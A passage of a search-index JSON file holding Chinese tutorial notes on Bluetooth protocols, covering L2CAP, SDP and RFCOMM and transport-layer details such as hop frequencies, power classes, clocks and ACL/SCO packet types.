SDP\u3001RFCOMM\u3001TCS \u7b49\u3002 \u5206\u6bb5\u91cd\u7ec4 \uff1aL2CAP\u5c42\u5e2e\u52a9\u5b9e\u73b0\u57fa\u5e26\u7684\u77ed PDU \u548c\u9ad8\u5c42\u7684\u957f PDU \u76f8\u4e92\u4f20\u8f93\uff0cL2CAP \u672c\u8eab\u4e0d\u5b8c\u6210\u4efb\u4f55 PDU \u7684\u5206\u6bb5\u91cd\u7ec4\uff0c\u5177\u4f53\u7684\u5206\u6bb5\u91cd\u7ec4\u6709\u4f4e\u5c42\u548c\u9ad8\u5c42\u6765\u5b8c\u6210\u3002 \u670d\u52a1\u8d28\u91cf Qualityof Serivce \u4fe1\u606f\u7684\u4ea4\u6362 \uff1a\u84dd\u7259\u5efa\u7acb\u8fde\u63a5\u7684\u8fc7\u7a0b\u4e2d\uff0cL2CAP\u5141\u8bb8\u4ea4\u4e92\u84dd\u7259\u6240\u671f\u671b\u7684\u670d\u52a1\u8d28\u91cf\uff0c\u5efa\u7acb\u5b8c\u6210\u540e\uff0c\u901a\u8fc7\u76d1\u89c6\u8d44\u6e90\u7684\u4f7f\u7528\u60c5\u51b5\uff0c\u6765\u4fdd\u8bc1\u670d\u52a1\u8d28\u91cf\u3002 \u7ec4\u62bd\u8c61 \uff1a L2CAP \u5ffd\u7565\u5730\u5740\u7ec4\u6982\u5ff5\uff0c\u4ed6\u53ea\u5173\u5fc3\u6570\u636e\u3002 L2CAP \u4fe1\u9053\u6709\u4e09\u79cd\u7c7b\u578b\uff1a \u9762\u5411\u8fde\u63a5\u4fe1\u9053\uff1a Connection-Oriented CO \uff0c\u7528\u4e8e\u4e24\u4e2a\u8bbe\u5907\u4e4b\u95f4\u7684\u6570\u636e\u901a\u4fe1\u3002 \u65e0\u8fde\u63a5\u4fe1\u9053\uff1a Connection-LessCL \uff0c\u7528\u6765\u5411\u4e00\u7ec4\u8bbe\u5907\u5e7f\u64ad\u65b9\u5f0f\u4f20\u8f93\u6570\u636e\u3002 CID \u4e3a\u56fa\u5b9a\u503c\uff1a 0x0002\u3002 \u4fe1\u4ee4\u4fe1\u9053\uff1a Signaling \uff0c\u7528\u4e8e\u521b\u5efa CO \u901a\u9053\uff0c\u53ef\u4ee5\u901a\u8fc7\u534f\u5546\u6539\u53d8 CO \u4fe1\u9053\u7684\u7279\u6027\u3002 \u534f\u8bae\u6570\u636e\u5355\u5143\uff1a","title":"2.\u903b\u8f91\u94fe\u8def\u63a7\u5236\u4e0e\u9002\u914d\u534f\u8bae L2CAP"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%AD%E4%BB%8B%E5%B1%82%E5%8D%8F%E8%AE%AE/#3-sdp","text":"SDP\u4e24\u79cd\u670d\u52a1\u53d1\u73b0\u6a21\u5f0f\uff1a \u670d\u52a1\u641c\u7d22\uff1a\u67e5\u8be2\u5177\u6709\u7279\u5b9a\u670d\u52a1\u5c5e\u6027\u7684\u670d\u52a1\uff1b \u670d\u52a1\u6d4f\u89c8\uff1a\u7b80\u5355\u7684\u6d4f\u89c8\u5168\u90e8\u53ef\u7528\u670d\u52a1\u3002 \u5176 PDU \uff08\u534f\u8bae\u6570\u636e\u5355\u5143\uff09\u683c\u5f0f\u4e3a\uff1a \u4e0d\u540c\u7684 PDU ID \u7684\u610f\u4e49\u4e3a\uff1a Value Parameter Descirption 0x00 Reserved \u4fdd\u7559 0x01 SDP_ErrorResponse \u9519\u8bef\u54cd\u5e94 0x02 SDP_ServiceSearchRequest \u670d\u52a1\u641c\u7d22\u8bf7\u6c42 0x03 SDP_ServiceSearchResponse \u670d\u52a1\u641c\u7d22\u54cd\u5e94 0x04 SDP_ServiceAttributeRequest \u670d\u52a1\u5c5e\u6027\u8bf7\u6c42 0x05 SDP_ServiceAttributeResponse \u670d\u52a1\u5c5e\u6027\u54cd\u5e94 0x06 SDP_ServiceSearchAttributeRequest \u670d\u52a1\u641c\u7d22\u5c5e\u6027\u8bf7\u6c42 0x07 SDP_ServiceSearchAttributeResponse \u670d\u52a1\u641c\u7d22\u5c5e\u6027\u54cd\u5e94 0x08-0xff Reserved \u4fdd\u7559","title":"3.\u670d\u52a1\u53d1\u73b0\u534f\u8bae SDP"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%AD%E4%BB%8B%E5%B1%82%E5%8D%8F%E8%AE%AE/#4-rfcomm","text":"RFCOMM \u662f\u4e3a\u5efa\u7acb\u5728\u4e32\u53e3\u4e4b\u4e0a\u7684\u4f20\u7edf\u5e94\u7528\u63d0\u4f9b\u73af\u5883\u63a5\u53e3\uff0c\u4f7f\u4ed6\u4eec\u53ef\u4ee5\u505a\u6bd4\u8f83\u5c11\u534f\u8bae\u6539\u52a8\u5c31\u53ef\u4ee5\u5728\u84dd\u7259\u65e0\u7ebf\u901a\u4fe1\u65e0\u7ebf\u94fe\u8def\u4e0a\u5de5\u4f5c\u3002\u591a\u8def\u4e32\u53e3\u4eff\u771f\u662f RFCOMM \u7684\u91cd\u8981\u529f\u80fd\uff0c\u901a\u8fc7\u591a\u8def\u590d\u7528\u5668( multiplexer )\uff0c\u4e00\u6761 L2CAP \u94fe\u8def\u53ef\u4ee5\u540c\u65f6 \u591a\u4e2a\u4e32\u884c\u5e94\u7528\u3002 RFCOMM \u4e24\u4e2a\u84dd\u7259\u8bbe\u5907\u4e4b\u95f4\u53ef\u4ee5\u652f\u6301\u591a\u8fbe60\u591a\u8def\u4eff\u771f\u4e32\u53e3\u3002 RFCOMM \u5e27\u7c7b\u578b\u5982\u4e0b\uff1a SABM \u5f02\u6b65\u5e73\u8861\u6a21\u5f0f\u8bbe\u7f6e\u6307\u4ee4 UA \u672a\u52a0\u7f16\u53f7\u7684\u786e\u8ba4\u54cd\u5e94 DM \u65ad\u5f00\u8fde\u63a5\u6a21\u5f0f\u54cd\u5e94 DISC \u65ad\u5f00\u8fde\u63a5\u6307\u4ee4 UIH \u5e26\u5934\u6821\u9a8c\u7684\u672a\u7f16\u53f7\u4fe1\u606f\u547d\u4ee4\u548c\u54cd\u5e94","title":"4.\u4e32\u53e3\u4eff\u771f\u534f\u8bae RFCOMM"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89%E4%B8%AD%E4%BB%8B%E5%B1%82%E5%8D%8F%E8%AE%AE/#x","text":"\u84dd\u7259\u6838\u5fc3\u6280\u672f\u6982\u8ff0\uff08\u56db\uff09\uff1a\u84dd\u7259\u534f\u8bae\u89c4\u8303\uff08HCI\u3001L2CAP\u3001SDP\u3001RFOCMM\uff09 \u539f\u6587\u94fe\u63a5\uff1a https://jacksmiththu.github.io/2017/07/06/\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u4e09\uff09\u4e2d\u4ecb\u5c42\u534f\u8bae/","title":"X.\u53c2\u8003\u8fde\u63a5"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/","text":"\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u4e8c\uff09\u4f20\u8f93\u5c42\u534f\u8bae 1.\u4f20\u8f93\u5c42\u534f\u8bae \u4f20\u8f93\u5c42\u4f4d\u4e8e\u84dd\u7259\u7cfb\u7edf\u7684\u5e95\u5c42\uff0c\u8d1f\u8d23\u84dd\u7259\u8bbe\u5907\u95f4\uff0c\u4e92\u76f8\u786e\u8ba4\u5bf9\u65b9\u7684\u4f4d\u7f6e\uff0c\u4ee5\u53ca\u5efa\u7acb\u548c\u7ba1\u7406\u84dd\u7259\u8bbe\u5907\u95f4\u7684\u7269\u7406\u94fe\u8def\u3002\u5176\u53c8\u5206\u4e3a\u5c04\u9891\u5c42\u3001\u57fa\u5e26\u5c42\u548c\u94fe\u8def\u7ba1\u7406\u5c42\u4e09\u90e8\u5206\u3002 2.\u5c04\u9891\u5c42\u534f\u8bae 2.1.\u5de5\u4f5c\u9891\u7387 \u84dd\u7259\u5de5\u4f5c\u5728 2.4 GHz ISM \u9891\u6bb5\u4e0a\uff0c\u84dd\u7259\u91c7\u7528\u8df3\u9891\u6269\u8c31\u6280\u672f\u4e3b\u52a8\u7684\u907f\u514d\u5de5\u4f5c\u9891\u6bb5\u53d7\u5e72\u6270\u3002\u6211\u56fd\u7684\u84dd\u7259\u9891\u7387\u5728 2.402 GHz\uff5e2.483 GHz ,\u84dd\u7259\u6bcf\u4e2a\u9891\u9053\u7684\u5bbd\u5ea6\u4e3a 1 MHz \uff0c\u4e3a\u4e86\u51cf\u5c11\u5e26\u5916\u8f90\u5c04\u7684\u5e72\u6270\uff0c\u4fdd\u7559\u4e0a\u3001\u4e0b\u4fdd\u62a4\u4e3a 3.5 MHz \u548c 2 MHz \uff0c 79 \u4e2a\u8df3\u9891\u70b9\u4e2d\u81f3\u5c11 75 \u4e2a\u4f2a\u968f\u673a\u7801\u8df3\u52a8\uff0c 30 s \u5185\u4efb\u4f55\u4e00\u4e2a\u9891\u70b9\u4f7f\u7528\u65f6\u957f\u4e0d\u80fd\u8d85\u8fc7 0.4 s \u3002 \u5730\u7406\u4f4d\u7f6e ISM\u9891\u6bb5\u8303\u56f4 \u5c04\u9891\u4fe1\u9053\u9891\u7387 \u4e2d\u56fd\u3001\u7f8e\u56fd\u3001\u6b27\u6d32 2400.0\uff5e2483.5MHz F=(2402+k)MHz,k\u57280\u30011\u3001\u2026\u202678\u4e2d\u968f\u673a\u53d6\u503c \u6cd5\u56fd 2446.5\uff5e2483.5MHz F=(2454+k)MHz,k\u57280\u30011\u3001\u2026\u202622\u4e2d\u968f\u673a\u53d6\u503c \u65e5\u672c 2471.0\uff5e2497.0MHz F=(2473+k)MHz,k\u57280\u30011\u3001\u2026\u202622\u4e2d\u968f\u673a\u53d6\u503c \u897f\u73ed\u7259 2445.0\uff5e2475.0MHz F=(2449+k)MHz,k\u57280\u30011\u3001\u2026\u202622\u4e2d\u968f\u673a\u53d6\u503c 2.2.\u8df3\u9891\u6280\u672f\u3001\u53d1\u5c04\u529f\u7387\u3001\u65f6\u9699 \u53d1\u5c04\u529f\u7387\uff1a\u84dd\u7259\u53d1\u5c04\u529f\u7387\u5206\u4e09\u7ea7\uff1a\u4e00\u7ea7\u529f\u7387 100 mW ( 20 dBm )\uff1b\u4e8c\u7ea7\u529f\u7387 2.5 mW ( 4 dBm )\uff1b\u4e09\u7ea7\u529f\u7387 1 mW ( 0 dBm )\uff1b \u7269\u7406\u4fe1\u9053\uff1a\u84dd\u7259\u7269\u7406\u4fe1\u9053\u6709\u4f2a\u968f\u673a\u5e8f\u5217\u63a7\u5236\u7684 79 \u4e2a\u8df3\u9891\u70b9\u6784\u6210\uff0c\u4e0d\u540c\u8df3\u9891\u5e8f\u5217\u4ee3\u8868\u4e0d\u540c\u7684\u4fe1\u9053\u3002 \u65f6\u9699\uff1a\u84dd\u7259\u8df3\u9891\u901f\u7387\u4e3a 1600 \u6b21/ s ,\u6bcf\u4e2a\u65f6\u95f4\u4e3a 625 us ( 1 s/1600 ) \u79f0\u4e3a\u4e00\u4e2a\u65f6\u9699\uff1b 3.\u57fa\u5e26\u5c42\u534f\u8bae \u84dd\u7259\u53d1\u9001\u6570\u636e\u65f6\uff0c\u57fa\u5e26\u90e8\u5206\u5c06\u6765\u81ea\u9ad8\u5c42\u7684\u6570\u636e\u8fdb\u884c\u4fe1\u9053\u7f16\u7801\uff0c\u5411\u4e0b\u53d1\u7ed9\u5c04\u9891\u8fdb\u884c\u53d1\u9001\uff1b\u63a5\u6536\u6570\u636e\u65f6\uff0c\u5c06\u89e3\u8c03\u6062\u590d\u7a7a\u4e2d\u6570\u636e\u5e76\u4e0a\u4f20\u7ed9\u57fa\u5e26\uff0c\u57fa\u5e26\u8fdb\u884c\u4fe1\u9053\u7f16\u7801\u4f20\u9001\u7ed9\u4e0a\u5c42\u3002 3.1.\u84dd\u7259\u5730\u5740 \u84dd\u7259\u8bbe\u5907\u7f16\u7801\u91c7\u53d6\u5c0f\u7aef\u6a21\u5f0f\uff0c\u5373\u9ad8\u4f4d\u5728\u540e\u9762\u3002\u5b83\u7684\u524d 24 \u4f4d\u662f\u5236\u9020\u5546\u5206\u914d\u7684\u4ea7\u54c1\u7f16\u53f7\uff08 LAP \uff0c\u4f4e\u5730\u5740\u90e8\u5206\uff09\uff0c\u4e2d\u95f48 \u4f4d\u662f SIG \u7ed9\u5236\u9020\u5546\u5206\u914d\u7684\u7f16\u53f7\uff08 UAP \uff0c\u9ad8\u5730\u5740\u90e8\u5206\uff09\uff0c\u6700\u540e 16 \u4f4d\u4fdd\u7559\u65e0\u6548\uff08 NAP \uff0c\u65e0\u6548\u5730\u5740\u90e8\u5206\uff09\u3002 3.2.\u84dd\u7259\u65f6\u949f \u6bcf\u4e2a\u84dd\u7259\u8bbe\u5907\u90fd\u6709\u4e00\u4e2a\u72ec\u7acb\u8fd0\u884c\u7684\u5185\u90e8\u7cfb\u7edf\u65f6\u949f\uff0c\u79f0\u4e3a\u672c\u5730\u65f6\u949f\uff08Local Clock\uff09\uff0c\u51b3\u5b9a\u5b9a\u65f6\u5668\u7684\u6536\u53d1\u8df3\u9891\u3002\u4e3a\u4e86\u4e0e\u5176\u4ed6\u8bbe\u5907\u540c\u6b65\uff0c\u672c\u5730\u65f6\u949f\u8981\u52a0\u4e00\u4e2a\u504f\u79fb\u91cf\uff08offset\uff09\uff0c\u63d0\u4f9b\u7ed9\u5176\u4ed6\u8bbe\u5907\u540c\u6b65\u3002 \u5177\u4f53\u8bf4\u6765\uff0c\u84dd\u7259\u7cfb\u7edf\u4e2d\u7684\u65f6\u949f\u5206\u4e3a\u4ee5\u4e0b\u51e0\u79cd\uff1a CLKN\uff1a \u672c\u5730\u65f6\u949f\uff1a CLKE\uff1a \u9884\u8ba1\u65f6\u949f\uff0c\u626b\u63cf\u5bfb\u547c\u8fc7\u7a0b\u4e2d\u7528\u5230\uff1b CLK\uff1a \u8bbe\u5907\u5b9e\u9645\u8fd0\u884c\u7684\u65f6\u949f\u3002 \u8fd9\u4e09\u8005\u4e4b\u95f4\u5b58\u5728\u7740\u76f8\u5173\u5173\u7cfb\uff0c\u5177\u4f53\u8bf4\u6765 CLKE \u3001 CLK \u7531 CLKN \u52a0\u4e0a\u4e00\u4e2a\u504f\u79fb\u91cf\u5f97\u5230\u7684\u3002 \u4e3b\u8bbe\u5907 \uff1a CLK = CLKN \u4ece\u8bbe\u5907 \uff1a CLK = CLKN + offset 3.3.\u84dd\u7259\u7269\u7406\u94fe\u8def \u901a\u4fe1\u8bbe\u5907\u95f4\u7269\u7406\u5c42\u7684\u6570\u636e\u8fde\u63a5\u901a\u9053\u5c31\u662f\u7269\u7406\u94fe\u8def\u3002 ACL \uff08A synchronous Connectionless \uff09\u5f02\u6b65\u65e0\u8fde\u63a5\u94fe\u8def\uff1b\u5bf9\u65f6\u95f4\u8981\u6c42\u4e0d\u654f\u611f\u7684\u6570\u636e\u901a\u4fe1\uff0c\u5982\u6587\u4ef6\u6570\u636e\u3001\u63a7\u5236\u4fe1\u4ee4\u7b49\u3002 SCO \uff08 Synochronous Connection Oriented \uff09\u540c\u6b65\u9762\u5411\u8fde\u63a5\u94fe\u8def\uff1b\u5bf9\u65f6\u95f4\u6bd4\u8f83\u654f\u611f\u7684\u901a\u4fe1\uff0c\u5982\uff1a\u8bed\u97f3\uff1b\u6700\u591a\u53ea\u652f\u63013\u6761 SCO \u94fe\u8def\uff0c\u4e0d\u652f\u6301\u91cd\u4f20\u3002 3.4.\u84dd\u7259\u57fa\u5e26\u5206\u7ec4 \u57fa\u5e26\u5206\u7ec4\u81f3\u5c11\u5305\u62ec\uff1a\u63a5\u5165\u7801\u3001\u5206\u7ec4\u5934\u3001\u6709\u6548\u8f7d\u8377\uff1b \u63a5\u5165\u7801 \u7528\u4e8e\u540c\u6b65\u3001\u76f4\u6d41\u3001\u8f7d\u9891\u6cc4\u6f0f\u504f\u7f6e\u8865\u507f\u6807\u8bc6\uff1b \u5206\u7ec4\u5934 \u5305\u542b\u94fe\u8def\u4fe1\u606f\uff0c\u786e\u4fdd\u7ea0\u6b63\u8f83\u591a\u7684\u9519\u8bef\u3002 \u8be6\u7ec6\u5206\u7ec4\u7c7b\u578b\u5982\u4e0b\uff1a \u5206\u7ec4\u7c7b\u522b Type (b3b2b1b0) \u65f6\u9699 SCO ACL \u94fe\u8def\u63a7\u5236\u5206\u7ec4 0000 1 NULL NULL 0001 POLL POLL 0010 FHS FHS 0011 DM1 DM1 \u5355\u65f6\u9699\u5206\u7ec4 0100 1 \u672a\u5b9a\u4e49 NULL 0101 HV1 0110 HV2 0111 HV3 1000 DV 1001 NULL AUX1 \u4e09\u65f6\u9699\u5206\u7ec4 1010 3 \u672a\u5b9a\u4e49 DM3 1011 1100 \u672a\u5b9a\u4e49 1101 \u4e94\u65f6\u9699\u5206\u7ec4 1110 5 \u672a\u5b9a\u4e49 DM5 1111 ACL\u5206\u7ec4\u5f62\u5f0f\u4e3a\uff1aD(M|H)\uff081|3|5\uff09,D \u4ee3\u8868\u6570\u636e\u5206\u7ec4\uff0c M \u4ee3\u8868\u7528 2/3 \u6bd4\u4f8b\u7684 FEC \u7684\u4e2d\u7b49\u901f\u7387\u5206\u7ec4\uff1b H \u4ee3\u8868\u4e0d\u4f7f\u7528\u7ea0\u9519\u7801\u7684\u9ad8\u901f\u7387\u5206\u7ec4\uff1b 1\u30013\u30015 \u5206\u522b\u4ee3\u8868\u5206\u7ec4\u6240\u5360\u7528\u7684\u65f6\u9699\u6570\u76ee\uff1b \u200bDM1\u3001DM3\u3001DM5\u3001DH1\u3001DH3\u3001DH5 * SCO\u5206\u7ec4\u5f62\u5f0f\u4e3a\uff1aHV(1|2|3)\u3002HV \u4ee3\u8868\u9ad8\u8d28\u91cf\u8bed\u8a00\u5206\u7ec4\uff0c 1\u30012\u30013 \u6709\u6548\u8f7d\u8377\u6240\u91c7\u7528\u7684\u7ea0\u9519\u7801\u65b9\u6cd5\u3002 1 \u4e3a 1/3 \u6bd4\u4f8b FEC \uff0c\u8bbe\u5907 2 \u4e2a\u65f6\u9699\u53d1\u9001\u4e00\u4e2a\u5355\u65f6\u9699\u5206\u7ec4\uff1b 2 \u4e3a 2/3 \u6bd4\u4f8b FEC \uff0c\u8bbe\u5907 4 \u4e2a\u65f6\u9699\u53d1\u9001\u4e00\u4e2a\u5355\u65f6\u9699\u5206\u7ec4\uff1b 3 \u4e3a\u4e0d\u4f7f\u7528\u7ea0\u9519\u7801\uff0c\u8bbe\u5907 6 \u4e2a\u65f6\u9699\u53d1\u9001\u4e00\u4e2a\u5355\u65f6\u9699\u5206\u7ec4\u3002 \u200bHV1\u3001HV2\u3001HV3 3.4.1.ACL\u5206\u7ec4 \u7c7b\u578b \u6709\u6548\u8f7d\u8377\u5934/\u5b57\u8282 \u7528\u6237\u6709\u6548\u8f7d\u8377/\u5b57\u8282 FEC CRC \u5bf9\u79f0\u6700\u5927\u901f\u7387/kbps \u975e\u5bf9\u79f0\u901f\u7387/kbps \u524d\u5411 \u540e\u5411 DM1 1 0\uff5e17 2/3 \u6709 108.8 108.8 108.8 DH1 1 0\uff5e27 \u65e0 \u6709 172.8 172.8 172.8 DM3 2 0\uff5e121 2/3 \u6709 258.1 387.2 54.4 DH3 2 0\uff5e183 \u65e0 \u6709 390.4 585.6 86.4 DM5 2 0\uff5e224 2/3 \u6709 286.7 477.8 36.3 MH5 2 0\uff5e339 \u65e0 \u6709 433.9 723.2 57.6 AUX1 1 0\uff5e29 \u65e0 \u65e0 185.6 185.6 185.6 3.4.2.SCO\u5206\u7ec4 \u7c7b\u578b \u6709\u6548\u8f7d\u8377\u5934/\u5b57\u8282 \u7528\u6237\u6709\u6548\u8f7d\u8377/\u5b57\u8282 FEC CRC \u6709\u6548\u8f7d\u8377\u957f\u5ea6 \u540c\u6b65\u901f\u7387/kbps \u5360\u7528Tsco\u6570\u76ee/\u8bed\u8a00\u957f\u5ea6 HV1 \u65e0 10 1/3 240\u4f4d 64 2/1.25ms HV2 20 2/3 4/2.5ms HV3 30 \u65e0 6/3.75ms 6/3.75ms 1D 10+(0-9)D 2/3D \u6709D 64+57.6D \u6ce8\u91ca\uff1a D \u8868\u793a\u53ea\u5bf9\u6570\u636e\u6bb5\u6709\u7528\uff0c DV \u8868\u793a\u5206\u7ec4\u5305\u542b\u6570\u636e\u6bb5\uff0c\u4e5f\u5305\u542b\u8bed\u8a00\u6bb5\u3002 X.\u53c2\u8003\u94fe\u63a5 \u84dd\u7259\u6838\u5fc3\u6280\u672f\u6982\u8ff0\uff08\u4e09\uff09\uff1a \u84dd\u7259\u534f\u8bae\u89c4\u8303\uff08\u5c04\u9891\u3001\u57fa\u5e26\u94fe\u8def\u63a7\u5236\u3001\u94fe\u8def\u7ba1\u7406\uff09 \u539f\u6587\u94fe\u63a5\uff1a https://jacksmiththu.github.io/2017/06/25/\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u4e8c\uff09\u4f20\u8f93\u5c42\u534f\u8bae/","title":"\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u4e8c\uff09\u4f20\u8f93\u5c42\u534f\u8bae"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/#_1","text":"","title":"\u84dd\u7259\u534f\u8bae\u5165\u95e8\uff08\u4e8c\uff09\u4f20\u8f93\u5c42\u534f\u8bae"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/#1","text":"\u4f20\u8f93\u5c42\u4f4d\u4e8e\u84dd\u7259\u7cfb\u7edf\u7684\u5e95\u5c42\uff0c\u8d1f\u8d23\u84dd\u7259\u8bbe\u5907\u95f4\uff0c\u4e92\u76f8\u786e\u8ba4\u5bf9\u65b9\u7684\u4f4d\u7f6e\uff0c\u4ee5\u53ca\u5efa\u7acb\u548c\u7ba1\u7406\u84dd\u7259\u8bbe\u5907\u95f4\u7684\u7269\u7406\u94fe\u8def\u3002\u5176\u53c8\u5206\u4e3a\u5c04\u9891\u5c42\u3001\u57fa\u5e26\u5c42\u548c\u94fe\u8def\u7ba1\u7406\u5c42\u4e09\u90e8\u5206\u3002","title":"1.\u4f20\u8f93\u5c42\u534f\u8bae"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/#2","text":"","title":"2.\u5c04\u9891\u5c42\u534f\u8bae"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/#21","text":"\u84dd\u7259\u5de5\u4f5c\u5728 2.4 GHz ISM \u9891\u6bb5\u4e0a\uff0c\u84dd\u7259\u91c7\u7528\u8df3\u9891\u6269\u8c31\u6280\u672f\u4e3b\u52a8\u7684\u907f\u514d\u5de5\u4f5c\u9891\u6bb5\u53d7\u5e72\u6270\u3002\u6211\u56fd\u7684\u84dd\u7259\u9891\u7387\u5728 2.402 GHz\uff5e2.483 GHz ,\u84dd\u7259\u6bcf\u4e2a\u9891\u9053\u7684\u5bbd\u5ea6\u4e3a 1 MHz \uff0c\u4e3a\u4e86\u51cf\u5c11\u5e26\u5916\u8f90\u5c04\u7684\u5e72\u6270\uff0c\u4fdd\u7559\u4e0a\u3001\u4e0b\u4fdd\u62a4\u4e3a 3.5 MHz \u548c 2 MHz \uff0c 79 \u4e2a\u8df3\u9891\u70b9\u4e2d\u81f3\u5c11 75 \u4e2a\u4f2a\u968f\u673a\u7801\u8df3\u52a8\uff0c 30 s \u5185\u4efb\u4f55\u4e00\u4e2a\u9891\u70b9\u4f7f\u7528\u65f6\u957f\u4e0d\u80fd\u8d85\u8fc7 0.4 s \u3002 \u5730\u7406\u4f4d\u7f6e ISM\u9891\u6bb5\u8303\u56f4 \u5c04\u9891\u4fe1\u9053\u9891\u7387 \u4e2d\u56fd\u3001\u7f8e\u56fd\u3001\u6b27\u6d32 2400.0\uff5e2483.5MHz F=(2402+k)MHz,k\u57280\u30011\u3001\u2026\u202678\u4e2d\u968f\u673a\u53d6\u503c \u6cd5\u56fd 2446.5\uff5e2483.5MHz F=(2454+k)MHz,k\u57280\u30011\u3001\u2026\u202622\u4e2d\u968f\u673a\u53d6\u503c \u65e5\u672c 2471.0\uff5e2497.0MHz F=(2473+k)MHz,k\u57280\u30011\u3001\u2026\u202622\u4e2d\u968f\u673a\u53d6\u503c \u897f\u73ed\u7259 2445.0\uff5e2475.0MHz F=(2449+k)MHz,k\u57280\u30011\u3001\u2026\u202622\u4e2d\u968f\u673a\u53d6\u503c","title":"2.1.\u5de5\u4f5c\u9891\u7387"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/#22","text":"\u53d1\u5c04\u529f\u7387\uff1a\u84dd\u7259\u53d1\u5c04\u529f\u7387\u5206\u4e09\u7ea7\uff1a\u4e00\u7ea7\u529f\u7387 100 mW ( 20 dBm )\uff1b\u4e8c\u7ea7\u529f\u7387 2.5 mW ( 4 dBm )\uff1b\u4e09\u7ea7\u529f\u7387 1 mW ( 0 dBm )\uff1b \u7269\u7406\u4fe1\u9053\uff1a\u84dd\u7259\u7269\u7406\u4fe1\u9053\u6709\u4f2a\u968f\u673a\u5e8f\u5217\u63a7\u5236\u7684 79 \u4e2a\u8df3\u9891\u70b9\u6784\u6210\uff0c\u4e0d\u540c\u8df3\u9891\u5e8f\u5217\u4ee3\u8868\u4e0d\u540c\u7684\u4fe1\u9053\u3002 \u65f6\u9699\uff1a\u84dd\u7259\u8df3\u9891\u901f\u7387\u4e3a 1600 \u6b21/ s ,\u6bcf\u4e2a\u65f6\u95f4\u4e3a 625 us ( 1 s/1600 ) \u79f0\u4e3a\u4e00\u4e2a\u65f6\u9699\uff1b","title":"2.2.\u8df3\u9891\u6280\u672f\u3001\u53d1\u5c04\u529f\u7387\u3001\u65f6\u9699"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/#3","text":"\u84dd\u7259\u53d1\u9001\u6570\u636e\u65f6\uff0c\u57fa\u5e26\u90e8\u5206\u5c06\u6765\u81ea\u9ad8\u5c42\u7684\u6570\u636e\u8fdb\u884c\u4fe1\u9053\u7f16\u7801\uff0c\u5411\u4e0b\u53d1\u7ed9\u5c04\u9891\u8fdb\u884c\u53d1\u9001\uff1b\u63a5\u6536\u6570\u636e\u65f6\uff0c\u5c06\u89e3\u8c03\u6062\u590d\u7a7a\u4e2d\u6570\u636e\u5e76\u4e0a\u4f20\u7ed9\u57fa\u5e26\uff0c\u57fa\u5e26\u8fdb\u884c\u4fe1\u9053\u7f16\u7801\u4f20\u9001\u7ed9\u4e0a\u5c42\u3002","title":"3.\u57fa\u5e26\u5c42\u534f\u8bae"},{"location":"other/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE/#31","text":"\u84dd\u7259\u8bbe\u5907\u7f16\u7801\u91c7\u53d6\u5c0f\u7aef\u6a21\u5f0f\uff0c\u5373\u9ad8\u4f4d\u5728\u540e\u9762\u3002\u5b83\u7684\u524d 24 \u4f4d\u662f\u5236\u9020\u5546\u5206\u914d\u7684\u4ea7\u54c1\u7f16\u53f7\uff08 LAP \uff0c\u4f4e\u5730\u5740\u90e8\u5206\uff09\uff0c\u4e2d\u95f48 \u4f4d\u662f SIG \u7ed9\u5236\u9020\u5546\u5206\u914d\u7684\u7f16\u53f7\uff08 UAP \uff0c\u9ad8\u5730\u5740\u90e8\u5206\uff09\uff0c\u6700\u540e 16 \u4f4d\u4fdd\u7559\u65e0\u6548\uff08 NAP 